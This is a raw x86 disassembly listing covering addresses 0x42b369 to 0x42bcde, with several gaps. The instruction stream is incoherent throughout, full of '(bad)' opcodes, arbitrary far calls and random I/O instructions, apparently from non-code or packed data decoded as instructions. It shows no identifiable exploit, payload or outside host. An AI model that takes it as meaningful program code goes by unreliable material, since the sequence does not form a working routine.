  42b369:	xchg   edi,eax
  42b36a:	xchg   edx,eax
  42b36b:	adc    DWORD PTR ds:0x65929d4e,esp
  42b371:	int3   
  42b372:	sub    DWORD PTR [eax],eax
  42b374:	cmp    BYTE PTR [ecx],cl
  42b376:	push   esi
  42b377:	inc    ebx
  42b378:	push   edx
  42b379:	mov    ds:0xfef2f22b,al
  42b37e:	fistp  DWORD PTR [esi+ebp*8+0x6d]
  42b382:	enter  0x77ca,0x63
  42b386:	(bad)  
  42b387:	(bad)  
  42b388:	and    al,0x4f
  42b38a:	or     eax,0xdcc10d8
  42b38f:	mov    bh,0xf1
  42b391:	(bad)  
  42b392:	loop   0x42b407
  42b394:	pop    eax
  42b395:	loop   0x42b32b
  42b397:	mov    dh,0x2d
  42b399:	pop    ebx
  42b39a:	xor    edi,edi
  42b39c:	dec    eax
  42b39d:	adc    DWORD PTR [edi-0x79],0xffffffb5
  42b3a1:	mov    BYTE PTR ds:0xce819917,al
  42b3a7:	add    BYTE PTR [edx+eax*4-0x39],ah
  42b3ab:	mov    edx,0x7fb26724
  42b3b0:	pop    DWORD PTR [edi-0x1787b630]
  42b3b6:	inc    ebx
  42b3b7:	dec    ebp
  42b3b8:	js     0x42b34f
  42b3ba:	jl     0x42b3b7
  42b3bc:	pop    ds
  42b3bd:	xlat   BYTE PTR ds:[ebx]
  42b3be:	imul   ebx,DWORD PTR [ecx-0x64b82387],0x6c
  42b3c5:	mov    cl,0xcf
  42b3c7:	adc    esp,esi
  42b3c9:	adc    esp,edi
  42b3cb:	hlt    
  42b3cc:	loop   0x42b3d8
  42b3ce:	and    DWORD PTR [ecx+eax*1],eax
  42b3d1:	sbb    BYTE PTR [edx],bl
  42b3d3:	iret   
  42b3d4:	adc    DWORD PTR [eax-0x6bd8e8d0],ecx
  42b3da:	pop    esp
  42b3db:	sub    al,0x8a
  42b3dd:	xor    edi,0x4bd1a612
  42b3e3:	loop   0x42b3a7
  42b3e5:	(bad)  
  42b3e6:	out    0xc5,eax
  42b3e8:	push   edx
  42b3e9:	pop    ecx
  42b3ea:	icebp  
  42b3eb:	lods   al,BYTE PTR ds:[esi]
  42b3ec:	pop    ebp
  42b3ed:	push   edx
  42b3ee:	iret   
  42b3ef:	fisub  DWORD PTR [esi-0x2be52175]
  42b3f5:	jb     0x42b38d
  42b3f7:	out    0xde,eax
  42b3f9:	inc    eax
  42b3fa:	push   edx
  42b3fb:	ficom  DWORD PTR [ebx+0x2a]
  42b3fe:	fstp   TBYTE PTR [esi-0x21]
  42b401:	call   0x2d8f:0x7ad15a5d
  42b408:	cmp    BYTE PTR [edx+0x33],bh
  42b40b:	xchg   DWORD PTR [edi-0x26],ebp
  42b40e:	jl     0x42b40f
	...
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   esp,esi
  42b481:	cmp    eax,0xcec039c7
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    al,0x1
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	sbb    ebp,esp
  42b48e:	cmp    ah,bh
  42b490:	call   0x83cf:0x235886c5
  42b497:	jbe    0x42b4d5
  42b499:	hlt    
  42b49a:	test   al,0x24
  42b49c:	jecxz  0x42b49e
  42b49e:	jno    0x42b4e1
  42b4a0:	stos   BYTE PTR es:[edi],al
  42b4a1:	push   edx
  42b4a2:	imul   ecx,DWORD PTR [ebx-0x67],0x20
  42b4a6:	ja     0x42b4ff
  42b4a8:	dec    edi
  42b4a9:	fidivr WORD PTR [ecx]
  42b4ab:	xchg   DWORD PTR ds:0xc231d47,eax
  42b4b1:	pop    ebp
  42b4b2:	xlat   BYTE PTR ds:[ebx]
  42b4b3:	adc    DWORD PTR [eax+0x6c],edx
  42b4b6:	pop    edx
  42b4b7:	jno    0x42b4e2
  42b4b9:	pushf  
  42b4ba:	cmc    
  42b4bb:	adc    DWORD PTR [edx+0x2a],esi
  42b4be:	rol    ch,0x30
  42b4c1:	daa    
  42b4c2:	int    0xc9
  42b4c4:	add    bh,BYTE PTR [eax+0x314e1e5]
  42b4ca:	mov    ecx,0xa6994234
  42b4cf:	xchg   edx,eax
  42b4d0:	cmp    dl,BYTE PTR [esi+0x25]
  42b4d3:	icebp  
  42b4d4:	loope  0x42b472
  42b4d6:	shl    DWORD PTR [ebp-0x69],1
  42b4d9:	mov    bl,0xcc
  42b4db:	or     eax,0x3b531a47
  42b4e0:	mov    cl,0xba
  42b4e2:	enter  0xcec7,0xc7
  42b4e6:	into   
  42b4e7:	cwde   
  42b4e8:	cs jge 0x42b560
  42b4eb:	adc    bh,ch
  42b4ed:	aam    0xf8
  42b4ef:	ret    
  42b4f0:	sub    DWORD PTR [ecx],0xffffffb4
  42b4f3:	popf   
  42b4f4:	jne    0x42b574
  42b4f6:	cmp    eax,0x8acf28d3
  42b4fb:	std    
  42b4fc:	sub    ah,0x2b
  42b4ff:	cmp    eax,0x6c92d043
  42b504:	adc    DWORD PTR [edi-0x19],edx
  42b507:	mov    dh,0x73
  42b509:	retf   
  42b50a:	lods   al,BYTE PTR ds:[esi]
  42b50b:	(bad)  
  42b50c:	mov    esp,0xab113b75
  42b511:	rcl    BYTE PTR ds:0x21a69476,1
  42b517:	inc    ebx
  42b518:	pop    esp
  42b519:	xor    eax,0x3fba5025
  42b51e:	sub    ah,0x88
  42b521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b522:	das    
  42b523:	ss add edi,esi
  42b526:	stos   BYTE PTR es:[edi],al
  42b527:	mov    cs,eax
  42b529:	cmp    BYTE PTR [edi+0x3],dl
  42b52c:	call   0xa3cc2228
  42b531:	les    esp,FWORD PTR [eax]
  42b533:	jle    0x42b551
  42b535:	cmp    ch,BYTE PTR [ebx]
  42b537:	fstp   DWORD PTR [ebx+0x1a0ad458]
  42b53d:	jno    0x42b567
  42b53f:	xlat   BYTE PTR ds:[ebx]
  42b540:	(bad)  
  42b541:	in     al,0x3
  42b543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b544:	nop
  42b545:	fsub   st(7),st
  42b547:	loop   0x42b4ff
  42b549:	jb     0x42b56b
  42b54b:	fnstenv [ebx-0x4d]
  42b54e:	push   edx
  42b54f:	test   ecx,eax
  42b551:	jecxz  0x42b564
  42b553:	enter  0x9a92,0x8
  42b557:	xchg   BYTE PTR [esi],ah
  42b559:	push   0x92ab4700
  42b55e:	and    DWORD PTR [edx],0x7d440acb
  42b564:	sub    ebx,DWORD PTR ds:[esi-0x36]
  42b568:	ffree  st(6)
  42b56a:	jno    0x42b5d6
  42b56c:	add    edx,DWORD PTR [eax+esi*8-0x2106d48c]
  42b573:	fwait
  42b574:	aaa    
  42b575:	mov    ds,WORD PTR [ebx]
  42b577:	mov    al,BYTE PTR [edi-0x4e]
  42b57a:	adc    ebx,DWORD PTR [eax]
  42b57c:	push   ss
  42b57d:	xor    BYTE PTR [esp+ebx*1+0x6f],dh
  42b581:	sbb    ebp,ecx
  42b583:	das    
  42b584:	lods   al,BYTE PTR ds:[esi]
  42b585:	pop    esp
  42b586:	pushf  
  42b587:	xchg   ebx,eax
  42b588:	jmp    0x6494d929
  42b58d:	jmp    esi
  42b58f:	add    BYTE PTR cs:[eax],al
	...
  42b5f2:	add    BYTE PTR [eax],al
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	xchg   edi,eax
  42b601:	cmp    DWORD PTR [edx+0x1cfc432],ecx
  42b607:	add    BYTE PTR [ecx+eax*1],al
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	ins    BYTE PTR es:[edi],dx
  42b60d:	jge    0x42b5ab
  42b60f:	and    DWORD PTR [eax+0x41],ecx
  42b612:	in     al,dx
  42b613:	fbstp  TBYTE PTR [edx+0x1a3e3eb5]
  42b619:	scas   al,BYTE PTR es:[edi]
  42b61a:	(bad)  
  42b61b:	adc    ebp,DWORD PTR [edi-0x27]
  42b61e:	fld    QWORD PTR [edx]
  42b620:	mov    DWORD PTR [eax],edi
  42b622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b623:	stos   DWORD PTR es:[edi],eax
  42b624:	push   esp
  42b625:	test   al,0x59
  42b628:	pop    ebp
  42b629:	stc    
  42b62a:	sbb    ah,BYTE PTR [edx+0x6e]
  42b62d:	lods   eax,DWORD PTR ds:[esi]
  42b62e:	into   
  42b62f:	sahf   
  42b630:	push   ds
  42b631:	mov    edi,0xa7e7474a
  42b636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b637:	shr    dl,cl
  42b639:	enter  0x2cb7,0x8e
  42b63d:	and    eax,0x92db0d0e
  42b642:	push   ecx
  42b643:	jno    0x42b62e
  42b645:	and    al,0xe3
  42b647:	pop    es
  42b648:	add    eax,DWORD PTR [ebx+0x1e3d5b6d]
  42b64e:	or     ebx,DWORD PTR [esi]
  42b650:	mov    ch,0x8c
  42b652:	cld    
  42b653:	jae    0x42b680
  42b655:	int3   
  42b656:	push   edx
  42b657:	or     al,0x90
  42b659:	sub    bl,bh
  42b65b:	jmp    0x4351:0x1d8e352c
  42b662:	jp     0x42b62e
  42b664:	push   ecx
  42b665:	adc    ecx,DWORD PTR [edi]
  42b667:	(bad)  
  42b668:	sti    
  42b669:	and    esp,DWORD PTR [edi-0x1f]
  42b66c:	or     esi,DWORD PTR [eax+0x91467d4]
  42b672:	dec    esp
  42b673:	and    DWORD PTR [edx-0x24],eax
  42b676:	mov    ch,ch
  42b678:	jb     0x42b5fd
  42b67a:	in     al,0x67
  42b67c:	sahf   
  42b67d:	cld    
  42b67e:	pop    ecx
  42b67f:	lea    ebp,[edx+0xf]
  42b682:	mov    ebx,0x1d6da6fe
  42b687:	mov    ebp,0x58eb6b41
  42b68c:	dec    ecx
  42b68d:	test   eax,0xc57b55c1
  42b692:	pushf  
  42b693:	in     al,0x1f
  42b695:	addr16 mov ds:0x80e4,al
  42b699:	into   
  42b69a:	ret    0x92ad
  42b69d:	or     ecx,ecx
  42b69f:	pushf  
  42b6a0:	sub    al,0x11
  42b6a2:	in     al,dx
  42b6a3:	jp     0x42b6a1
  42b6a5:	call   0x6581da50
  42b6aa:	(bad)  
  42b6ab:	push   ss
  42b6ac:	inc    ecx
  42b6ad:	sbb    al,0x69
  42b6af:	inc    esp
  42b6b0:	mov    ebx,0xa656cff5
  42b6b5:	call   0xe0f3:0xd9cad077
  42b6bc:	pop    esp
  42b6bd:	repnz mov edi,0x1792ad10
  42b6c3:	shl    BYTE PTR es:[ecx],1
  42b6c6:	rcr    BYTE PTR es:[edx-0x1174ceb3],1
  42b6cd:	dec    ebp
  42b6ce:	sub    ecx,DWORD PTR [ecx-0x4d]
  42b6d1:	in     eax,dx
  42b6d2:	sahf   
  42b6d3:	shl    DWORD PTR [eax-0x3694d479],cl
  42b6d9:	dec    ecx
  42b6da:	stos   DWORD PTR es:[edi],eax
  42b6db:	lods   eax,DWORD PTR ds:[esi]
  42b6dc:	int    0xc4
  42b6de:	bnd jno 0x42b6f2
  42b6e1:	jbe    0x42b71a
  42b6e3:	ds adc eax,0xd38d2c0e
  42b6e9:	and    esi,eax
  42b6eb:	fistp  DWORD PTR [ebx]
  42b6ed:	xor    eax,0xdb783a90
  42b6f2:	rcl    DWORD PTR [ecx-0x39],0x1d
  42b6f6:	cmp    ecx,DWORD PTR [ecx-0x52]
  42b6f9:	cmp    bl,dl
  42b6fb:	or     esi,DWORD PTR [esp+edx*8+0x71407f81]
  42b702:	jae    0x42b744
  42b704:	sbb    DWORD PTR [esi+0x75],eax
  42b707:	pop    ebx
  42b708:	pop    esi
  42b709:	sub    eax,0x4d9c42af
  42b70e:	push   esi
  42b70f:	pop    DWORD PTR [eax]
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	loopne 0x42b73d
  42b782:	stc    
  42b783:	aam    0xc8
  42b785:	rol    BYTE PTR [ecx],1
  42b787:	add    BYTE PTR [ecx+eax*1],al
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	ret    0x4464
  42b78f:	data16 mov ah,0x27
  42b792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b793:	mov    DWORD PTR [ebx],ebp
  42b795:	dec    eax
  42b796:	dec    esp
  42b797:	cs mov ebx,ecx
  42b79a:	jo     0x42b73b
  42b79c:	sub    al,0x41
  42b79e:	push   ds
  42b79f:	mov    ch,0xf7
  42b7a1:	aam    0xf8
  42b7a3:	test   BYTE PTR [eax],0x36
  42b7a6:	inc    esi
  42b7a7:	xchg   DWORD PTR [esi+esi*2],edi
  42b7aa:	mov    dh,0x6a
  42b7ac:	push   0xcdb33168
  42b7b1:	(bad)  
  42b7b2:	xor    ecx,ebp
  42b7b4:	and    ch,al
  42b7b6:	xchg   ecx,eax
  42b7b7:	inc    esi
  42b7b8:	es in  al,0x6e
  42b7bb:	jmp    0x9b70:0x2a1144fd
  42b7c2:	adc    edi,DWORD PTR [ebp-0x30d08823]
  42b7c8:	push   ebp
  42b7c9:	fild   DWORD PTR es:[ecx+ebx*2-0xd]
  42b7ce:	sbb    BYTE PTR [ebx],bl
  42b7d0:	cli    
  42b7d1:	(bad)  
  42b7d2:	out    dx,al
  42b7d3:	out    0x2d,eax
  42b7d5:	mov    al,0x89
  42b7d7:	mov    edi,DWORD PTR [eax+edx*8]
  42b7da:	and    eax,0x523e7618
  42b7df:	test   BYTE PTR [edx+0x34],ah
  42b7e2:	mov    dh,0xcb
  42b7e4:	dec    edx
  42b7e5:	adc    BYTE PTR [esi+0x58],al
  42b7e8:	out    0xde,al
  42b7ea:	push   ebx
  42b7eb:	sar    BYTE PTR [ecx],cl
  42b7ed:	outs   dx,BYTE PTR ds:[esi]
  42b7ee:	mov    ch,0xd5
  42b7f0:	aas    
  42b7f1:	es push cs
  42b7f3:	cmp    BYTE PTR [ebx],0x7e
  42b7f6:	push   0xffffffbb
  42b7f8:	jl     0x42b7d4
  42b7fa:	ss (bad) 
  42b7fc:	(bad)  
  42b7fe:	cld    
  42b7ff:	jg     0x42b7fa
  42b801:	or     DWORD PTR [eax+0x19],edx
  42b804:	retf   
  42b805:	or     eax,0x169d7fc9
  42b80a:	aam    0x55
  42b80c:	pop    es
  42b80d:	repnz fmul DWORD PTR es:[edi]
  42b811:	scas   eax,DWORD PTR es:[edi]
  42b812:	jge    0x42b869
  42b814:	addr16 iret 
  42b816:	add    BYTE PTR [esi+0x42],dl
  42b819:	jecxz  0x42b81f
  42b81b:	imul   BYTE PTR [edx+ebx*8+0x10]
  42b81f:	xchg   edi,eax
  42b820:	inc    edx
  42b821:	les    edx,FWORD PTR [eax+0xa]
  42b824:	(bad)  
  42b825:	pop    es
  42b826:	jge    0x42b823
  42b828:	test   eax,0xa4c36297
  42b82d:	fwait
  42b82e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b82f:	test   BYTE PTR [edx+0x55],dl
  42b832:	ret    
  42b833:	xchg   ecx,eax
  42b834:	push   ds
  42b835:	dec    ebx
  42b836:	mov    eax,ds:0xd5fb4237
  42b83b:	(bad)  
  42b83c:	xchg   esp,eax
  42b83d:	dec    esi
  42b83e:	inc    ebp
  42b83f:	stc    
  42b840:	fnsave [edx]
  42b842:	pop    esp
  42b843:	add    al,0x24
  42b845:	cmp    al,0x24
  42b847:	pusha  
  42b848:	xor    al,al
  42b84a:	es pop esi
  42b84c:	pop    ebx
  42b84d:	mov    ecx,eax
  42b84f:	ficom  DWORD PTR [edi+0x365e716]
  42b855:	fist   WORD PTR [edx]
  42b857:	in     eax,0xad
  42b859:	dec    ecx
  42b85a:	scas   eax,DWORD PTR es:[edi]
  42b85b:	pop    eax
  42b85c:	xchg   esp,eax
  42b85d:	xchg   ecx,eax
  42b85e:	test   eax,0xd670218
  42b863:	in     al,0xc4
  42b865:	imul   edx,DWORD PTR [ecx],0xda84ab55
  42b86b:	jnp    0x42b828
  42b86d:	inc    ebp
  42b86e:	jmp    0x42b7f6
  42b870:	dec    esi
  42b871:	pop    eax
  42b872:	jne    0x42b88f
  42b874:	fcmove st,st(4)
  42b876:	adc    eax,0x36cbd8d
  42b87b:	mov    ah,0xf5
  42b87d:	pop    ecx
  42b87e:	push   edi
  42b87f:	arpl   WORD PTR [esi+0x2a14d163],bp
  42b885:	mov    ds:0xe501241e,eax
  42b88a:	dec    edi
  42b88b:	test   bh,bh
  42b88d:	jl     0x42b8d5
  42b88f:	cmp    DWORD PTR [eax],eax
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     eax,DWORD PTR [esi-0x3339471c]
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	dec    edx
  42b90d:	jb     0x42b8a8
  42b90f:	aam    0xfa
  42b911:	add    esi,DWORD PTR [ebx-0x6c824143]
  42b917:	fdivr  QWORD PTR [ecx-0x6b]
  42b91a:	pop    esi
  42b91b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b91c:	stc    
  42b91d:	sbb    al,0xa
  42b91f:	adc    al,bl
  42b921:	mov    BYTE PTR ds:0x5f167759,ah
  42b927:	pop    esi
  42b928:	dec    eax
  42b929:	push   edx
  42b92a:	loope  0x42b922
  42b92c:	push   ecx
  42b92d:	dec    edx
  42b92e:	imul   esi,DWORD PTR [ebx],0xffffffe1
  42b931:	shr    BYTE PTR [edi+0x7761ecee],cl
  42b937:	sub    ecx,DWORD PTR [edx+edx*8]
  42b93a:	sub    bl,ch
  42b93c:	out    dx,eax
  42b93d:	and    al,0x45
  42b93f:	mov    al,BYTE PTR [ebx+0x26]
  42b942:	xor    edi,DWORD PTR [eax+0x8b9fe91]
  42b948:	pop    edi
  42b949:	cmp    DWORD PTR ds:0xe556abe2,ebp
  42b94f:	and    DWORD PTR [edi+0x67],esp
  42b952:	lods   eax,DWORD PTR ds:[esi]
  42b953:	xor    DWORD PTR [edi],0x1c8e65d5
  42b959:	pop    edx
  42b95a:	lods   eax,DWORD PTR ds:[esi]
  42b95b:	dec    ebp
  42b95c:	jns    0x42b95b
  42b95e:	shr    DWORD PTR [edi-0xd],cl
  42b961:	add    al,0x69
  42b963:	movaps XMMWORD PTR [esi-0x21],xmm2
  42b967:	adc    BYTE PTR [eax-0x323f22a],cl
  42b96d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b96e:	(bad)  
  42b96f:	int    0xb7
  42b971:	mov    ebx,?
  42b973:	fwait
  42b974:	push   esp
  42b975:	push   cs
  42b976:	ja     0x42b9b8
  42b978:	pop    edi
  42b979:	in     al,dx
  42b97a:	call   0xf73c:0x258bcfd9
  42b981:	xchg   esp,eax
  42b982:	xor    eax,0x5a2c8ef7
  42b987:	inc    ebp
  42b988:	xor    al,0x7c
  42b98b:	cmp    al,0xbd
  42b98d:	pop    ebp
  42b98e:	retf   0x632b
  42b991:	stc    
  42b992:	pop    ss
  42b993:	jnp    0x42b9b2
  42b995:	mov    ch,0x2a
  42b997:	aam    0xab
  42b999:	dec    edi
  42b99a:	adc    bl,dh
  42b99c:	sbb    DWORD PTR [esi+0x184c085],edi
  42b9a2:	sbb    ecx,DWORD PTR [edi]
  42b9a4:	ins    DWORD PTR es:[edi],dx
  42b9a5:	data16 sbb BYTE PTR [ebx-0x6bc83b85],bl
  42b9ac:	hlt    
  42b9ad:	pop    ebp
  42b9ae:	ficom  WORD PTR ds:0x694450d1
  42b9b4:	push   ss
  42b9b5:	xor    DWORD PTR [esi-0x2338f881],edx
  42b9bb:	mov    eax,ds:0x34de26cb
  42b9c0:	mov    bl,bl
  42b9c2:	cmp    bh,ah
  42b9c4:	ret    0xa094
  42b9c7:	fsub   QWORD PTR [ebp-0x43a9b242]
  42b9cd:	mov    ecx,0xa5cca7be
  42b9d2:	rcr    DWORD PTR [esi],1
  42b9d4:	lea    esi,[ecx+0x51a1c061]
  42b9da:	or     BYTE PTR [eax+0x73],bl
  42b9dd:	add    eax,0x6f3e925d
  42b9e2:	sti    
  42b9e3:	fs out dx,al
  42b9e5:	push   ecx
  42b9e6:	nop
  42b9e7:	mov    ebp,0x2d490685
  42b9ec:	div    BYTE PTR ds:0xd2fdc966
  42b9f2:	mov    bh,0x3f
  42b9f4:	push   esp
  42b9f5:	popf   
  42b9f6:	pop    ecx
  42b9f7:	in     eax,0xd8
  42b9f9:	adc    al,0x9a
  42b9fb:	in     eax,dx
  42b9fc:	bnd je 0x42ba1a
  42b9ff:	bound  esp,QWORD PTR [edx+0x6c]
  42ba02:	mov    WORD PTR cs:[esi+ebp*4],ss
  42ba06:	dec    esi
  42ba07:	mov    dl,0x9a
  42ba09:	rol    DWORD PTR [ecx+0x6a],0x8a
  42ba0d:	shr    BYTE PTR [edx+eiz*2+0x0],0x0
	...
  42ba72:	add    BYTE PTR [eax],al
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [esi-0x36],ebp
  42ba82:	or     BYTE PTR [edi+0x1d2d0],bl
  42ba88:	add    al,0x1
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	arpl   WORD PTR [eax-0x79],di
  42ba8f:	jmp    0x37e92b29
  42ba94:	mov    al,ds:0x5aa70f64
  42ba99:	xor    eax,0x4d720dfe
  42ba9e:	dec    eax
  42ba9f:	popf   
  42baa0:	(bad)  
  42baa2:	xchg   BYTE PTR [edx+ebp*4+0x6e],dl
  42baa6:	push   esi
  42baa7:	fcmovnu st,st(1)
  42baa9:	(bad)  
  42baaa:	and    BYTE PTR [edi+0x5ee47e87],ch
  42bab0:	or     DWORD PTR [edi+0x1631b231],esi
  42bab6:	popf   
  42bab7:	xor    al,BYTE PTR [ebp+0x7c42fea4]
  42babd:	enter  0x63c0,0x9b
  42bac1:	retf   
  42bac2:	xchg   ecx,eax
  42bac3:	jbe    0x42bb0e
  42bac5:	sbb    dh,al
  42bac7:	or     eax,0xe39f5a31
  42bacc:	jae    0x42bad2
  42bace:	xor    al,0xfd
  42bad0:	test   eax,0xd36c526b
  42bad5:	mov    ds:0x1d7e7c32,eax
  42bada:	shl    BYTE PTR ds:0x98ee2024,0xa
  42bae1:	mov    ch,0x38
  42bae3:	repnz and al,0x99
  42bae6:	call   0xcd9ff41d
  42baeb:	mov    ds:0xc44c747d,al
  42baf0:	mov    bl,0x6d
  42baf2:	sbb    eax,0x56bc4a34
  42baf7:	shr    BYTE PTR [ebx],1
  42baf9:	jle    0x42bae2
  42bafb:	js     0x42bab8
  42bafd:	push   0x6c8e12e9
  42bb02:	test   BYTE PTR [ebp-0x2efbc1c7],cl
  42bb08:	lds    esi,FWORD PTR ds:0x67275cf2
  42bb0e:	mov    al,ds:0xac23c338
  42bb13:	neg    DWORD PTR [edx-0x347c4b98]
  42bb19:	je     0x42bb65
  42bb1b:	add    ebx,DWORD PTR [bp-0x76c1]
  42bb20:	adc    DWORD PTR [edx-0x7a337c7e],ecx
  42bb26:	inc    ecx
  42bb27:	or     eax,0x4666932c
  42bb2c:	mov    ebx,0xa5221af9
  42bb31:	cmp    DWORD PTR [ecx],edi
  42bb33:	popa   
  42bb34:	loop   0x42badc
  42bb36:	add    eax,0x896e230d
  42bb3b:	xchg   edi,eax
  42bb3c:	pop    ebx
  42bb3d:	dec    ebp
  42bb3e:	stos   DWORD PTR es:[edi],eax
  42bb3f:	or     al,0xf5
  42bb41:	push   ebp
  42bb42:	mov    eax,DWORD PTR [edi]
  42bb44:	xlat   BYTE PTR ds:[ebx]
  42bb45:	jb     0x42bb6c
  42bb47:	sbb    dh,dl
  42bb49:	loopne 0x42bbb7
  42bb4b:	mov    bl,0xb6
  42bb4d:	mov    cl,0x29
  42bb4f:	mov    edi,0x4915c691
  42bb54:	enter  0x70df,0xb0
  42bb58:	scas   al,BYTE PTR es:[edi]
  42bb59:	cdq    
  42bb5a:	adc    bl,BYTE PTR [ebx]
  42bb5c:	loop   0x42baf3
  42bb5e:	jl     0x42bbb1
  42bb60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb61:	out    0x6a,eax
  42bb63:	jl     0x42bbe1
  42bb65:	cmp    DWORD PTR cs:[edx+0x48],0xb9e67ca4
  42bb6d:	fisubr DWORD PTR [eax]
  42bb6f:	in     eax,dx
  42bb70:	imul   ecx,DWORD PTR [edi+0x144fd303],0xffffff8c
  42bb77:	mov    eax,0xb0b2aa22
  42bb7c:	mov    ds:0x2259f148,al
  42bb81:	shl    DWORD PTR [ebx],0x1c
  42bb84:	pop    edx
  42bb85:	inc    edx
  42bb86:	int3   
  42bb87:	fsubr  DWORD PTR [ecx+eax*4]
  42bb8a:	shr    BYTE PTR [edx+0x3b9931ee],1
	...
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	ins    BYTE PTR es:[edi],dx
  42bc01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc02:	rol    DWORD PTR [edi],cl
  42bc04:	aam    0xd3
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    al,0x1
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	jmp    0x3151:0x2f40a825
  42bc13:	xchg   ebx,eax
  42bc14:	in     eax,dx
  42bc15:	adc    ch,dl
  42bc17:	loop   0x42bbae
  42bc19:	out    0xbb,eax
  42bc1b:	pop    esp
  42bc1c:	xor    eax,0xd0f68fd2
  42bc21:	sbb    DWORD PTR [esi],ecx
  42bc23:	pusha  
  42bc24:	cmp    eax,0x95f7a36a
  42bc29:	adc    bl,BYTE PTR [eax-0x7]
  42bc2c:	hlt    
  42bc2d:	dec    ebp
  42bc2e:	and    ebp,eax
  42bc30:	mov    edi,0xf8093dba
  42bc35:	test   DWORD PTR [edx],edx
  42bc37:	ins    DWORD PTR es:[edi],dx
  42bc38:	(bad)  
  42bc39:	int    0x3f
  42bc3b:	dec    ebp
  42bc3c:	and    bl,BYTE PTR [ecx+esi*1+0x61]
  42bc40:	xchg   edx,eax
  42bc41:	stc    
  42bc42:	imul   eax,ebx,0x7c1e1031
  42bc48:	fisub  WORD PTR [ebx+ecx*8]
  42bc4b:	xor    eax,0xb2cdbd90
  42bc50:	jno    0x42bc00
  42bc52:	fist   WORD PTR [esi]
  42bc54:	lahf   
  42bc55:	loopne 0x42bcc7
  42bc57:	in     al,dx
  42bc58:	lds    edi,FWORD PTR [eax]
  42bc5a:	sub    dl,BYTE PTR [eax-0x80]
  42bc5d:	shr    DWORD PTR [ebp+0x16],0x65
  42bc61:	mov    eax,ds:0x1b6ed09
  42bc66:	rcl    DWORD PTR [eax],cl
  42bc68:	int    0x5c
  42bc6a:	or     DWORD PTR ds:0x75fe00aa,ebp
  42bc70:	cli    
  42bc71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc72:	push   ebx
  42bc73:	leave  
  42bc74:	test   eax,0xf2e15dd
  42bc79:	xchg   esp,eax
  42bc7a:	imul   ebp,DWORD PTR [ebx],0x3571ccb
  42bc80:	sub    ebx,DWORD PTR [edi+0x52]
  42bc83:	lea    edx,[ebp+0xf]
  42bc86:	jne    0x42bc6c
  42bc88:	out    dx,al
  42bc89:	loopne 0x42bd02
  42bc8b:	pusha  
  42bc8c:	int3   
  42bc8d:	adc    dl,BYTE PTR [eax]
  42bc8f:	lds    edi,FWORD PTR [edi]
  42bc91:	xor    ebp,esi
  42bc93:	ss or  ebp,edx
  42bc96:	push   ecx
  42bc97:	test   al,0x48
  42bc99:	scas   eax,DWORD PTR es:[edi]
  42bc9a:	xchg   edi,eax
  42bc9b:	fwait
  42bc9c:	jne    0x42bc55
  42bc9e:	scas   eax,DWORD PTR es:[edi]
  42bc9f:	aas    
  42bca0:	adc    BYTE PTR [edi-0x37f5cce9],ch
  42bca6:	adc    DWORD PTR [ebx-0x74],ebx
  42bca9:	and    DWORD PTR gs:[eax],ebx
  42bcac:	add    ebx,esp
  42bcae:	popf   
  42bcaf:	fmul   QWORD PTR [edx]
  42bcb1:	sbb    DWORD PTR ds:0xb4a7bf30,esi
  42bcb7:	shl    edx,1
  42bcb9:	aaa    
  42bcba:	shl    BYTE PTR [ebx-0x7c69fd56],cl
  42bcc0:	sub    ch,al
  42bcc2:	add    DWORD PTR [eax-0x61],ebx
  42bcc5:	std    
  42bcc6:	sub    edx,DWORD PTR [edx]
  42bcc8:	hlt    
  42bcc9:	(bad)  
  42bcca:	jne    0x42bc89
  42bccc:	pop    esp
  42bccd:	cwde   
  42bcce:	scas   al,BYTE PTR es:[edi]
  42bccf:	cwde   
  42bcd0:	mov    ebp,0x43e8a7cd
  42bcd5:	leave  
  42bcd6:	push   DWORD PTR cs:[eax-0x44df9504]
  42bcdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bcde:	das    
